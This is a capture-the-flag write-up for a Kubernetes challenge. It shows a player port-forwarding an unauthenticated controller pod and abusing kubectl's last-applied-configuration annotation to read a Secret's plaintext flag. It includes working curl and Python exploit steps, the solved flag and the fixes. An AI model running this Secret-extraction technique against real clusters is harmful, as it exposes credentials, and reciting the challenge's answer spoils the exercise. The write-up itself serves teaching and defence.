# Challenge Deployment

**Category:** misc (kubernetes) · **Points:** 80 · **Solves:** 106 · **Author:** p4ck3t0

## Challenge

A small "challenge tracker" for running a CTF: a web UI where organisers create
challenge entries, attach flags and stage them. Everything is backed by a
Kubernetes cluster, and the instance gives you a kubeconfig for a deliberately
under-privileged service account.

Handout: `challenge-deployment.tar.gz` with the source of the three services, the
manifests (CRD, deployments, ten Secrets, nine demo challenges) and a `kind.sh`
that rebuilds the whole cluster locally.

## TL;DR

The player role was meant to expose only `svc/ui`, but it grants
`pods/portforward` without `resourceNames`, so the `controller` pod — a Flask app
with no authentication in front of it — can be port-forwarded directly. Its
`POST /apply` merges the live object into the submitted document and then shells
out to `kubectl apply`, which always writes
`metadata.annotations["kubectl.kubernetes.io/last-applied-configuration"]` = the
whole applied object as JSON, flag Secret `data` included. `GET /debug` renders
that annotation verbatim, because `mask_secret()` only blanks the `data` /
`stringData` dictionaries. The real flag sits in the one Secret that no demo
challenge references.

## Files

| file | description |
|---|---|
| `controller.py` | the only service with a service account; `/challenges`, `/debug`, `/flags`, `/apply`, `/delete` |
| `api.py` | internal API: template fetching, placeholder rendering, flag creation |
| `ui.py` | the web UI on port 8080 |
| `common.py` | shared constants (`NAMESPACE`, CRD group/kind, template hosts) |
| `challenge.yaml` | namespace `ctf`, CRD `challenges.fluxfingers.ctf`, SA + Role for the controller, 10 Secrets, 9 demo Challenges, the template web servers |
| `user.yaml` | SA/Role/RoleBinding `ctf-player` — the permissions the instance kubeconfig carries |
| `kind.sh`, `build.sh`, `Dockerfile` | local rebuild of the cluster and image |
| `images.png` | UI screenshot |

Tools: `kubectl`, `python3` (the script uses only the standard library).
The local rebuild needs Docker and `kind`, but the remote instance is enough.

## Analysis

### Three services, one credential

`ui.py`, `api.py` and `controller.py` are three pods built from the same image
(`python3.12-slim` + `kubectl`). Only the controller pod gets a token
(`challenge-controller`), and `challenge.yaml` gives it exactly:

```
apiGroups: [fluxfingers.ctf]  resources: [challenges]  verbs: [get list create update patch delete]
apiGroups: [""]               resources: [secrets]     verbs: [get list create patch]
```

No pods, no jobs, no deployments — verified by submitting a `Pod`, `Job` and
`Service` through the controller's `/apply` and getting
`{"error":"kubernetes: Forbidden"}` back. The UI is supposed to be the only
entry point, and it talks to `api`, which talks to `controller`.

### The player role is broader than the UI it protects

`user.yaml`:

```yaml
- apiGroups: [""]
  resources: ["services"]
  verbs: ["get"]
  resourceNames: ["ui"]
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
- apiGroups: [""]
  resources: ["pods/portforward"]
  verbs: ["create", "get"]
```

The last rule has no `resourceNames`, so it is not "forward the UI pod", it is
"forward any pod in this namespace". `pods get/list` even tells you which one.
That is the confinement break: the controller pod listens on plain HTTP port
8080 with Flask's development server, no auth, no session, no CSRF token.

(`kubectl port-forward svc/ui 8080:80`, as the handout suggests, does *not* work
for this account: resolving a service to a pod needs endpoints access, which the
Role withholds. Pod forwarding does not.)

### The controller shells out to `kubectl apply`

`controller.py`:

```python
def _apply(doc):
    doc.setdefault("metadata", {})["namespace"] = NAMESPACE
    resource = DYN.resources.get(api_version=doc["apiVersion"], kind=doc["kind"])
    name = doc["metadata"]["name"]
    try:
        live = resource.get(name=name, namespace=NAMESPACE).to_dict()
    except NotFoundError:
        live = None
    body = merge(live, doc) if live else doc
    meta = body.setdefault("metadata", {})
    for field in ("managedFields", "resourceVersion", "uid", "creationTimestamp"):
        meta.pop(field, None)
    body.pop("status", None)
    proc = subprocess.run(
        ["kubectl", "apply", "-n", NAMESPACE, "-f", "-"],
        input=yaml.safe_dump(body), capture_output=True, text=True,
    )
```

Two details matter:

1. `merge(live, doc)` is a recursive dictionary merge that starts from the
   **live** object. Submitting a Secret document that only carries
   `metadata.name` therefore produces a body that still contains the server's
   `data` — the merge pulls the secret payload into the document that is about to
   be applied.
2. `kubectl apply` is client-side apply: it records the applied manifest in the
   `kubectl.kubernetes.io/last-applied-configuration` annotation. For a Secret
   that annotation is the full object, `data` with the base64 values included.

The only reason this leaks is the asymmetry in the reader:

```python
def mask_secret(obj):
    obj = copy.deepcopy(obj)
    for field in ("data", "stringData"):
        if isinstance(obj.get(field), dict):
            obj[field] = {key: MASK for key in obj[field]}
    return obj

def dump_resource(obj):
    obj = copy.deepcopy(obj)
    (obj.get("metadata") or {}).pop("managedFields", None)
    return yaml.safe_dump(obj, sort_keys=False)
```

`dump_resource` strips `managedFields` but keeps `metadata.annotations`;
`mask_secret` only blanks top-level `data`/`stringData`. The annotation survives
both filters and carries the plaintext-in-base64 secret.

### Which Secret holds the flag

`challenge.yaml` contains ten Secrets and nine `Challenge` objects, and each of
those nine references one Secret via `spec.flagRef`. All nine hold the handout
placeholder `flag{FAKE}`. The tenth Secret is referenced by nothing and is the
one place the deployed instance keeps the real value:

```
6c057691-9a9d-49ea-aaea-cbe69f20b46f
```

`GET /flags` on the controller confirms the set of Secret names (data masked),
and `/challenges` shows that none of them points at this one.

## Solution

### 1. Forward the controller pod

```bash
export KUBECONFIG=$PWD/kubeconfig.yaml
kubectl -n ctf get pods
```

`controller-<hash>` is the pod to take. Forward its unauthenticated API:

```bash
kubectl -n ctf port-forward pod/controller-<hash> 18081:8080 &
curl -s http://127.0.0.1:18081/challenges | head
```

### 2. Apply a Challenge plus a bare Secret document

`/apply` requires at least one `kind: Challenge` in the multi-document input
(`require_challenge`), and it will normalise that Challenge (`metadata.name` is
regenerated from `spec.id`). The second document is the Secret we want to read
back: only `metadata.name`, so that `merge(live, doc)` fills in the live `data`
and `kubectl apply` stores it in the annotation.

```bash
python3 solve.py
```

observed:

```
[*] target Secret: 6c057691-9a9d-49ea-aaea-cbe69f20b46f
[*] POST /apply -> {'names': ['leak', '6c057691-9a9d-49ea-aaea-cbe69f20b46f'], 'ok': True}
[+] annotation data: {'flag': 'flag{1ts_alw4ys_DNS_4lso_1n_K8s}'}
```

The same thing by hand, if you prefer curl:

```bash
curl -s -X POST -H 'Content-Type: application/json' -d '{"yaml":"apiVersion: fluxfingers.ctf/v1\nkind: Challenge\nmetadata: {name: leak}\nspec: {id: leak, title: leak, description: leak, stage: Planned, flagRef: 6c057691-9a9d-49ea-aaea-cbe69f20b46f}\n---\napiVersion: v1\nkind: Secret\nmetadata: {name: 6c057691-9a9d-49ea-aaea-cbe69f20b46f}\ntype: Opaque\n"}' \
  http://127.0.0.1:18081/apply

curl -s 'http://127.0.0.1:18081/debug?name=leak' > debug.json
python3 - <<'PY'
import base64, json
blob = json.load(open("debug.json"))["debug"]
lines = blob.splitlines()
i = next(n for n, l in enumerate(lines) if "last-applied-configuration" in l)
ann = lines[i].split(": ", 1)[1].strip().strip("'")
if not ann.endswith("}"):              # yaml folds the long scalar
    ann += lines[i + 1].strip().strip("'")
data = json.loads(ann)["data"]
print({k: base64.b64decode(v).decode() for k, v in data.items()})
PY
```

`/debug?name=leak` returns the Challenge plus its `flagRef` Secret (whose own
`data` is masked as `***`), and the annotation is a JSON string embedded in that
YAML — the snippet above unwraps it and base64-decodes `data.flag`.

### 3. Decode

`data.flag` is base64 (`ZmxhZ3sx...`), so the last step is a `base64 -d`. Nothing
else in the dump is needed; the annotation is the only unmasked copy of the
Secret's payload.

## Flag

```
flag{1ts_alw4ys_DNS_4lso_1n_K8s}
```

## Notes

- The bug is a *reader/writer mismatch*, not a missing authorisation check: the
  controller is allowed to read the Secret, and it does mask the Secret when
  dumping it. It just also stores a second copy of the same bytes somewhere the
  masker does not look. Any object with a
  `kubectl.kubernetes.io/last-applied-configuration` annotation has the same
  property; Secrets are the interesting case because the annotation is written by
  `kubectl` itself, not by the application.
- The fix is cheap: switch the controller to server-side apply
  (`kubectl apply --server-side`), or drop `metadata.annotations` in
  `dump_resource`, or strip the annotation before dumping. Server-side apply does
  not write that annotation at all.
- The unreferenced tenth Secret is what makes the leak sufficient: you do not
  need to know the flag reference, only a Secret name, and `/flags` gives those
  away (with data masked) for free.
- `merge()` is also a prototype-pollution-shaped primitive, but the RBAC of the
  controller service account limits it to `challenges` and `secrets`; pod-, job-
  and service-shaped escapes are rejected by the API server with `Forbidden`
  before `kubectl apply` is ever reached.
